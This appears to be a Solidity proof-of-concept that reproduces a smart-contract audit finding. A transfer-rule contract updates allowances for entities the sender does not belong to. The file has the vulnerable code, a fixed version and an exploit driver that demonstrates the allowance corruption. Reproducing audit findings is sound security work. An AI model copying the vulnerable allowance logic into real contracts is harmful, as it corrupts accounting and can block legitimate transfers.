// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Remora Dynamic Tokens finding 63781:
// "Updating the entity allowance when the individual belongs to a group that has
//  multiple catalysts for different entities can result in mistakenly modifying
//  the allowance of entities where the individual is not even part of."
//
// The 5/50-rule enforcement contract (FiveFiftyRule) tracks, per Entity, how much
// transfer "allowance" its catalyst still has. On a transfer FROM an individual,
// canTransfer iterates over EVERY member of the sender's group and, for each
// member that is a catalyst on ANY entity, calls _updateEntityAllowance — which
// then mutates that catalyst's entities. Because a group can contain catalysts
// for UNRELATED entities, a transfer from InvestorA ends up mutating EntityB and
// EntityD (entities InvestorA is not part of), merely because co-group member
// InvestorB is their catalyst. That corrupts unrelated entities' accounting on
// the sender path, and on the receiver path (add=false) an under-allowanced
// unrelated entity makes a legitimate transfer return false (DoS).
//
// The FiveFiftyRule.canTransfer sender-branch and _updateEntityAllowance below
// are the VERBATIM vulnerable code from the finding (comments stripped, the
// elided `...` reconstructed minimally). FiveFiftyRuleFixed applies Cyfrin's
// recommendation ("do not update entities where `from`/`to` are not part of").
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal faithful double for OpenZeppelin's SafeCast.toUint64.
library SafeCast {
    function toUint64(uint256 value) internal pure returns (uint64) {
        require(value <= type(uint64).max, "SafeCast: value doesn't fit in 64 bits");
        return uint64(value);
    }
}

/// @dev Minimal ERC20 double used only as the corruption MARKER token: the harm
///      magnitude (the allowance an unrelated entity was wrongly credited) is
///      minted to the SINK so the harm is measurable as a balance delta.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract. The canTransfer sender-branch and _updateEntityAllowance
// are reproduced VERBATIM from the finding.
// ─────────────────────────────────────────────────────────────────────────────
contract FiveFiftyRule {
    uint256 internal constant REMORA_PERCENT_DENOMINATOR = 10000;

    struct IndividualData {
        bool isEntity;
        uint8 numCatalyst;
        uint256 groupId;
    }

    struct GroupData {
        uint256 numCatalyst;
        address[] individuals;
    }

    struct EntityData {
        uint64 allowance;
        address catalyst;
        uint256 equity;
    }

    mapping(address => IndividualData) public individualData;
    mapping(uint256 => GroupData) internal groups;
    mapping(address => EntityData) public entityData;
    mapping(address => address[]) internal findEntity;

    // ── configuration setters (reach the vulnerable state; not part of the bug) ──
    function setIndividual(address who, bool isEntity, uint8 numCatalyst, uint256 groupId) external {
        individualData[who] = IndividualData(isEntity, numCatalyst, groupId);
    }

    function setGroup(uint256 gId, uint256 numCatalyst, address[] memory individuals) external {
        groups[gId].numCatalyst = numCatalyst;
        groups[gId].individuals = individuals;
    }

    function setEntity(address entity, uint64 allowance, address catalyst, uint256 equity) external {
        entityData[entity] = EntityData(allowance, catalyst, equity);
    }

    function setFindEntity(address inv, address[] memory entities) external {
        findEntity[inv] = entities;
    }

    function getEntityAllowance(address e) external view returns (uint64) {
        return entityData[e].allowance;
    }

    // ── the audited entry point ──
    function canTransfer(address from, address to, uint256 amount) external returns (bool) {
        IndividualData storage iFrom = individualData[from];
        uint256 gId = iFrom.groupId;

        // ===== sender (`from`) branch — VERBATIM vulnerable code from the finding =====
        if (iFrom.isEntity) {
            entityData[from].allowance += SafeCast.toUint64(amount);
        } else if (gId != 0 && groups[gId].numCatalyst != 0) {
            uint256 len = groups[gId].individuals.length;
            for (uint256 i; i < len; ++i) {
                address ind = groups[gId].individuals[i];
                if (individualData[ind].numCatalyst != 0) // @> enters for ANY group member that is a catalyst, even when it is not `from`, so `from`'s transfer mutates unrelated entities
                    _updateEntityAllowance(true, ind, amount);
            }
        }

        // ===== receiver (`to`) branch — minimal reconstruction (add=false) of the
        // elided counterpart; it drives the verbatim _updateEntityAllowance subtract
        // / return-false path that produces the receiver-side DoS. =====
        IndividualData storage iTo = individualData[to];
        uint256 gIdTo = iTo.groupId;
        if (iTo.isEntity) {
            if (SafeCast.toUint64(amount) > entityData[to].allowance) return false;
            entityData[to].allowance -= SafeCast.toUint64(amount);
        } else if (gIdTo != 0 && groups[gIdTo].numCatalyst != 0) {
            uint256 len2 = groups[gIdTo].individuals.length;
            for (uint256 i; i < len2; ++i) {
                address ind = groups[gIdTo].individuals[i];
                if (individualData[ind].numCatalyst != 0) {
                    if (!_updateEntityAllowance(false, ind, amount)) return false;
                }
            }
        }
        return true;
    }

    // ===== _updateEntityAllowance — VERBATIM vulnerable code from the finding =====
    function _updateEntityAllowance(bool add, address inv, uint256 amount) internal returns (bool) {
        uint8 numCatalyst = individualData[inv].numCatalyst;

        uint256 len = findEntity[inv].length;

        for (uint256 i; i < len; ++i) {
            if (numCatalyst == 0) break;

            EntityData storage aData = entityData[findEntity[inv][i]];

            if (aData.catalyst != inv) continue;

            --numCatalyst;

            uint64 adjusted_amt = SafeCast.toUint64(
                (REMORA_PERCENT_DENOMINATOR / aData.equity) * amount
            );
            if (add) aData.allowance += adjusted_amt;
            else if (adjusted_amt > aData.allowance) return false;
            else aData.allowance -= adjusted_amt;
        }
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract: implements Cyfrin's mitigation — do NOT update entities the
// transferring party (`from`/`to`) is not part of. The membership guard leaves
// unrelated entities untouched.
// ─────────────────────────────────────────────────────────────────────────────
contract FiveFiftyRuleFixed {
    uint256 internal constant REMORA_PERCENT_DENOMINATOR = 10000;

    struct IndividualData {
        bool isEntity;
        uint8 numCatalyst;
        uint256 groupId;
    }

    struct GroupData {
        uint256 numCatalyst;
        address[] individuals;
    }

    struct EntityData {
        uint64 allowance;
        address catalyst;
        uint256 equity;
    }

    mapping(address => IndividualData) public individualData;
    mapping(uint256 => GroupData) internal groups;
    mapping(address => EntityData) public entityData;
    mapping(address => address[]) internal findEntity;

    function setIndividual(address who, bool isEntity, uint8 numCatalyst, uint256 groupId) external {
        individualData[who] = IndividualData(isEntity, numCatalyst, groupId);
    }

    function setGroup(uint256 gId, uint256 numCatalyst, address[] memory individuals) external {
        groups[gId].numCatalyst = numCatalyst;
        groups[gId].individuals = individuals;
    }

    function setEntity(address entity, uint64 allowance, address catalyst, uint256 equity) external {
        entityData[entity] = EntityData(allowance, catalyst, equity);
    }

    function setFindEntity(address inv, address[] memory entities) external {
        findEntity[inv] = entities;
    }

    function getEntityAllowance(address e) external view returns (uint64) {
        return entityData[e].allowance;
    }

    function _isMemberOfEntity(address who, address entity) internal view returns (bool) {
        address[] storage ents = findEntity[who];
        for (uint256 i; i < ents.length; ++i) {
            if (ents[i] == entity) return true;
        }
        return false;
    }

    function canTransfer(address from, address to, uint256 amount) external returns (bool) {
        IndividualData storage iFrom = individualData[from];
        uint256 gId = iFrom.groupId;

        if (iFrom.isEntity) {
            entityData[from].allowance += SafeCast.toUint64(amount);
        } else if (gId != 0 && groups[gId].numCatalyst != 0) {
            uint256 len = groups[gId].individuals.length;
            for (uint256 i; i < len; ++i) {
                address ind = groups[gId].individuals[i];
                if (individualData[ind].numCatalyst != 0)
                    _updateEntityAllowance(true, ind, amount, from); // FIX: bind to the transfer party
            }
        }

        IndividualData storage iTo = individualData[to];
        uint256 gIdTo = iTo.groupId;
        if (iTo.isEntity) {
            if (SafeCast.toUint64(amount) > entityData[to].allowance) return false;
            entityData[to].allowance -= SafeCast.toUint64(amount);
        } else if (gIdTo != 0 && groups[gIdTo].numCatalyst != 0) {
            uint256 len2 = groups[gIdTo].individuals.length;
            for (uint256 i; i < len2; ++i) {
                address ind = groups[gIdTo].individuals[i];
                if (individualData[ind].numCatalyst != 0) {
                    if (!_updateEntityAllowance(false, ind, amount, to)) return false;
                }
            }
        }
        return true;
    }

    function _updateEntityAllowance(bool add, address inv, uint256 amount, address party) internal returns (bool) {
        uint8 numCatalyst = individualData[inv].numCatalyst;
        uint256 len = findEntity[inv].length;
        for (uint256 i; i < len; ++i) {
            if (numCatalyst == 0) break;
            EntityData storage aData = entityData[findEntity[inv][i]];
            if (aData.catalyst != inv) continue;
            // FIX: only touch entities the transferring party is actually part of.
            if (!_isMemberOfEntity(party, findEntity[inv][i])) continue;
            --numCatalyst;
            uint64 adjusted_amt = SafeCast.toUint64(
                (REMORA_PERCENT_DENOMINATOR / aData.equity) * amount
            );
            if (add) aData.allowance += adjusted_amt;
            else if (adjusted_amt > aData.allowance) return false;
            else aData.allowance -= adjusted_amt;
        }
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver (cheatcode-free). Configures the finding's exact table, then a
// single transfer FROM InvestorA corrupts EntityB — an entity InvestorA is NOT
// part of. The wrongly-credited allowance magnitude is minted to the SINK as the
// measurable harm marker.
//
//   Entity  Investors           Catalyst      | Group   Investors        numCat
//   EntityA InvestorA,InvestorB  InvestorB     | GroupA  InvestorA,InvestorB  4
//   EntityB InvestorB,InvestorC  InvestorB     | GroupB  InvestorC,InvestorD  0
//   EntityC InvestorA,InvestorC  InvestorA     |
//   EntityD InvestorB,InvestorC  InvestorB     | Investor numCatalyst
//                                              | A:1  B:3  C:0  D:0
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    // Investors and entities are plain accounts (keys), not deployed contracts.
    address internal constant INVESTOR_A = address(0xA1);
    address internal constant INVESTOR_B = address(0xB2);
    address internal constant INVESTOR_C = address(0xC3);
    address internal constant INVESTOR_D = address(0xD4);
    address internal constant ENTITY_A = address(0xE1);
    address internal constant ENTITY_B = address(0xE2); // unrelated to InvestorA
    address internal constant ENTITY_C = address(0xE3);
    address internal constant ENTITY_D = address(0xE4);
    address internal constant NEUTRAL = address(0xFF); // unregistered receiver (no side effects)

    uint256 internal constant GROUP_A = 1;
    uint256 internal constant GROUP_B = 2;

    uint256 internal constant AMOUNT = 1000;
    uint64 internal constant INITIAL_ALLOWANCE = 1_000_000;

    // exposed results
    FiveFiftyRule public rule;
    MiniToken public marker;
    address public ruleAddr;
    address public markerAddr;

    uint64 public entityB_before;
    uint64 public entityB_after;
    uint256 public corruptionDelta; // allowance wrongly credited to unrelated EntityB
    uint256 public sinkMarkerBalance;

    constructor() {
        rule = new FiveFiftyRule(); // deploy index 0
        marker = new MiniToken("Corrupted Allowance", "CORRUPTED-ALLOWANCE"); // deploy index 1
        ruleAddr = address(rule);
        markerAddr = address(marker);
    }

    function _configure(address r) internal {
        FiveFiftyRule fr = FiveFiftyRule(r);

        // individuals (isEntity=false; numCatalyst per finding table; group id)
        fr.setIndividual(INVESTOR_A, false, 1, GROUP_A);
        fr.setIndividual(INVESTOR_B, false, 3, GROUP_A);
        fr.setIndividual(INVESTOR_C, false, 0, GROUP_B);
        fr.setIndividual(INVESTOR_D, false, 0, GROUP_B);

        // groups
        address[] memory gA = new address[](2);
        gA[0] = INVESTOR_A;
        gA[1] = INVESTOR_B;
        fr.setGroup(GROUP_A, 4, gA);

        address[] memory gB = new address[](2);
        gB[0] = INVESTOR_C;
        gB[1] = INVESTOR_D;
        fr.setGroup(GROUP_B, 0, gB);

        // entities: (allowance, catalyst, equity). equity=5000 → factor 10000/5000 = 2.
        fr.setEntity(ENTITY_A, INITIAL_ALLOWANCE, INVESTOR_B, 5000);
        fr.setEntity(ENTITY_B, INITIAL_ALLOWANCE, INVESTOR_B, 5000);
        fr.setEntity(ENTITY_C, INITIAL_ALLOWANCE, INVESTOR_A, 5000);
        fr.setEntity(ENTITY_D, INITIAL_ALLOWANCE, INVESTOR_B, 5000);

        // findEntity: the entities each investor belongs to
        address[] memory feA = new address[](2);
        feA[0] = ENTITY_A;
        feA[1] = ENTITY_C;
        fr.setFindEntity(INVESTOR_A, feA);

        address[] memory feB = new address[](3);
        feB[0] = ENTITY_A;
        feB[1] = ENTITY_B;
        feB[2] = ENTITY_D;
        fr.setFindEntity(INVESTOR_B, feB);

        address[] memory feC = new address[](3);
        feC[0] = ENTITY_B;
        feC[1] = ENTITY_C;
        feC[2] = ENTITY_D;
        fr.setFindEntity(INVESTOR_C, feC);
    }

    function run() external payable {
        _configure(ruleAddr);

        // EntityB is unrelated to InvestorA (InvestorA is member of EntityA & EntityC only).
        entityB_before = rule.getEntityAllowance(ENTITY_B);

        // A single legitimate transfer FROM InvestorA to a neutral receiver.
        rule.canTransfer(INVESTOR_A, NEUTRAL, AMOUNT);

        // HARM: EntityB's allowance was mutated even though InvestorA is not part of it.
        entityB_after = rule.getEntityAllowance(ENTITY_B);
        require(entityB_after > entityB_before, "no corruption");
        corruptionDelta = uint256(entityB_after) - uint256(entityB_before);

        // record the wrongly-credited magnitude as the harm marker at the SINK.
        marker.mint(SINK, corruptionDelta);
        sinkMarkerBalance = marker.balanceOf(SINK);
        require(sinkMarkerBalance == corruptionDelta, "marker mismatch");
    }
}
